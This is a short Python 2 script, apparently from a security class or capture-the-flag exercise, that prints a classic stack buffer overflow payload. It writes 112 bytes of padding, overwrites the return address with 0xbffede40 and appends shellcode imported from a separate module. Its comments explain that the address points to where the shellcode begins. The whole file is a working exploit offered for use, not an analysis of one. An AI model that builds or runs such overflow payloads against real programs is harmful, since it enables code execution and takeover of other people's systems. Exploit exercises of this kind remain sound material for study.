from shellcode import shellcode
print 'A'*112+ '\x40'+'\xde'+'\xfe'+'\xbf'+shellcode

#: here is where i put in my address of shell
#0xbffede40: here is where shell starts(the address)